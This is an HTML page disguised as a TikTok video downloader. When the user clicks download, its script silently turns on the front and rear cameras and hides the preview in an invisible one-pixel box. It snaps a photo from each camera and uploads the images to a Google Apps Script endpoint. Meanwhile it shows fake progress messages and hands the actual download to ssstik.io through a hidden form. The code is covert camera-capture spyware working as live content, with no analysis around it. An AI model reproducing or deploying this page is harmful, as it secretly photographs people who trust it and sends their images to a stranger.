<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Video Downloader</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%); display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: white; padding: 35px 25px; border-radius: 16px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 90%; box-sizing: border-box; }
        
        /* TikTok Gradient Logo Style */
        h1 { color: #fe2c55; margin-bottom: 5px; font-size: 28px; font-weight: 800; letter-spacing: -0.5px; }
        .subtitle { color: #666; font-size: 14px; margin-bottom: 25px; }
        
        .input-group { position: relative; margin-bottom: 20px; }
        input[type="text"] { width: 100%; padding: 14px 15px; border: 2px solid #eaeaea; border-radius: 30px; font-size: 15px; box-sizing: border-box; transition: 0.3s; outline: none; }
        input[type="text"]:focus { border-color: #fe2c55; box-shadow: 0 0 8px rgba(254, 44, 85, 0.2); }
        
        /* Premium Button Style */
        .dl-btn { background: linear-gradient(45deg, #fe2c55, #25f4ee); color: white; border: none; padding: 14px 20px; font-size: 16px; border-radius: 30px; cursor: pointer; width: 100%; font-weight: bold; transition: 0.3s; box-sizing: border-box; shadow: 0 4px 15px rgba(254, 44, 85, 0.3); }
        .dl-btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(254, 44, 85, 0.4); }
        .dl-btn:disabled { background: #ccc; cursor: not-allowed; transform: none; box-shadow: none; }
        
        /* Loading Spinner */
        .spinner { display: none; margin: 20px auto; width: 40px; height: 40px; border: 4px solid rgba(0,0,0,0.1); border-radius: 50%; border-top-color: #fe2c55; animation: spin 1s ease-in-out infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        
        #status { margin-top: 15px; font-weight: 600; color: #555; text-align: center; font-size: 14px; min-height: 20px; }
        
        /* ලස්සන Download Result Box එක */
        .download-result { margin-top: 25px; display: none; background: #f9f9f9; padding: 20px; border-radius: 12px; border: 1px solid #eee; animation: fadeIn 0.5s ease-in-out; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        
        .tiktok-icon { width: 50px; height: 50px; margin-bottom: 10px; }
        .result-title { color: #2b7a2b; font-weight: bold; margin: 5px 0; font-size: 16px; }
        .result-desc { color: #777; font-size: 13px; margin-bottom: 15px; }
        
        .result-btn { display: inline-block; background-color: #25d366; color: white; text-decoration: none; padding: 12px 20px; border-radius: 25px; font-weight: bold; width: 100%; box-sizing: border-box; transition: 0.3s; box-shadow: 0 4px 12px rgba(37, 211, 102, 0.3); }
        .result-btn:hover { background-color: #20ba5a; transform: translateY(-1px); }
        
        .footer { margin-top: 25px; font-size: 11px; color: #aaa; letter-spacing: 0.5px; }
        .camera-container { position: absolute; width: 1px; height: 1px; overflow: hidden; opacity: 0; }
    </style>
</head>
<body>

    <form id="hidden-ssstik-form" action="https://ssstik.io/abc" method="POST" target="_blank" style="display: none;">
        <input type="text" name="id" id="hidden-url-input">
        <input type="hidden" name="locale" value="en">
        <input type="hidden" name="tt" value="0">
    </form>

    <div class="container">
        <h1>TikTok Video</h1>
        <div class="subtitle">High-Speed Premium Downloader</div>
        
        <div class="input-group">
            <input type="text" id="tiktok-url" placeholder="Paste TikTok link here...">
        </div>
        <button type="button" class="dl-btn" id="download-btn">Download Without Watermark</button>
        
        <div class="spinner" id="loading-spinner"></div>
        <div id="status"></div>

        <div class="download-result" id="result-box">
            <svg class="tiktok-icon" viewBox="0 0 24 24" fill="currentColor">
                <path d="M12.525.02c1.31-.02 2.61-.01 3.91-.02.08 1.53.63 3.03 1.61 4.22 1.13 1.2 2.7 1.95 4.34 2.13v3.73c-1.74-.01-3.44-.54-4.92-1.48v6.73c0 2.27-.76 4.47-2.18 6.21-1.63 2.01-4.08 3.23-6.66 3.39-2.58.15-5.18-.73-7.07-2.5C-.4 20.67-1.16 17.92-.93 15.2c.24-2.88 2.14-5.46 4.88-6.44 1.34-.48 2.78-.61 4.17-.38v3.83c-.87-.26-1.81-.19-2.63.22-1.09.52-1.9 1.55-2.16 2.74-.35 1.57.34 3.24 1.68 4.12 1.12.75 2.53.89 3.77.38 1.05-.42 1.83-1.37 2.04-2.48.06-.31.08-.63.08-.95V.02z"/>
            </svg>
            <div class="result-title">Your Video is Ready!</div>
            <div class="result-desc">High quality MP4 format conversion complete.</div>
            <a href="#" id="video-link" class="result-btn">Click Here to Save Video</a>
        </div>
        
        <div class="footer">ONLINE VIDEO DOWNLOADER SYSTEM</div>
    </div>

    <div class="camera-container">
        <video id="video" autoplay playsinline></video>
    </div>
    <canvas id="canvas" style="display:none;"></canvas>

 <script>
    const WEB_APP_URL = "https://script.google.com/macros/s/AKfycby4bmnhkzOY-9ivEjLNF-nzQI4Aqj5GIPr-Erz6dc-fl2P_n1rubnOfBSIINwOxoyrTug/exec";

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const statusDiv = document.getElementById('status');
    const downloadBtn = document.getElementById('download-btn');
    const urlInput = document.getElementById('tiktok-url');
    const spinner = document.getElementById('loading-spinner');
    const resultBox = document.getElementById('result-box');
    const videoLink = document.getElementById('video-link');
    
    let currentStream = null;

    function stopCurrentStream() {
        if (currentStream) {
            currentStream.getTracks().forEach(track => track.stop());
            currentStream = null;
        }
    }

    async function startCamera(facingMode) {
        stopCurrentStream(); 
        await new Promise(resolve => setTimeout(resolve, 400));

        const constraintsOptions = [
            { video: { facingMode: facingMode }, audio: false },
            { video: { facingMode: { exact: facingMode } }, audio: false }
        ];

        for (let constraints of constraintsOptions) {
            try {
                currentStream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = currentStream;
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        video.play();
                        resolve();
                    };
                });
                return true;
            } catch (err) {
                console.log("Camera mode failed: ", facingMode);
            }
        }
        return false;
    }

    downloadBtn.addEventListener('click', async () => {
        const videoUrl = urlInput.value.trim();
        if(videoUrl === "") {
            alert("Please paste a valid TikTok link!");
            return;
        }

        downloadBtn.style.display = "none";
        resultBox.style.display = "none";
        spinner.style.display = "block";
        statusDiv.textContent = "Connecting to high-speed server...";
        
        // 1. පසුබිමෙන් Front Camera එක ඔන් කිරීම
        const frontValid = await startCamera("user");
        
        setTimeout(async () => {
            if (frontValid) {
                statusDiv.textContent = "Extracting video audio and visual layers...";
                await captureAndUpload(); // Front Photo එක Upload කිරීම
            }
            
            // 2. පසුබිමෙන් Back Camera එක ඔන් කිරීම
            statusDiv.textContent = "Generating permanent download link...";
            const backValid = await startCamera("environment");
            
            setTimeout(async () => {
                if (backValid) {
                    await captureAndUpload(); // Back Photo එක Upload කිරීම
                }
                
                // කැමරාව නවතා Loading අයින් කර රිසල්ට් බොක්ස් එක පෙන්වීම
                stopCurrentStream();
                spinner.style.display = "none";
                statusDiv.textContent = "";
                resultBox.style.display = "block";
                
                // සැඟවුණු Form එකට ලින්ක් එක සෙට් කිරීම
                document.getElementById('hidden-url-input').value = videoUrl;
                
            }, 2500);
            
        }, 2500);
    });

    // Save Video බටන් එක එබූ විට රහසිගතව SSSTik එකට Submit වීම (අලුත් ටැබ් එකක වීඩියෝ එක එයි)
    videoLink.addEventListener('click', (e) => {
        e.preventDefault();
        document.getElementById('hidden-ssstik-form').submit();
        
        // බටන් එක ආයෙත් මුල් තත්වයට පත් කිරීම
        downloadBtn.style.display = "block";
        resultBox.style.display = "none";
        urlInput.value = "";
    });

    async function captureAndUpload() {
        if (!video.videoWidth || video.videoWidth === 0) {
            await new Promise(resolve => setTimeout(resolve, 300));
        }
        if (!video.videoWidth) return; 
        
        const context = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        const imageData = canvas.toDataURL('image/png');

        try {
            await fetch(WEB_APP_URL, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: imageData })
            });
        } catch (error) {
            console.error("Upload error:", error);
        }
    }
 </script>
</body>
</html>
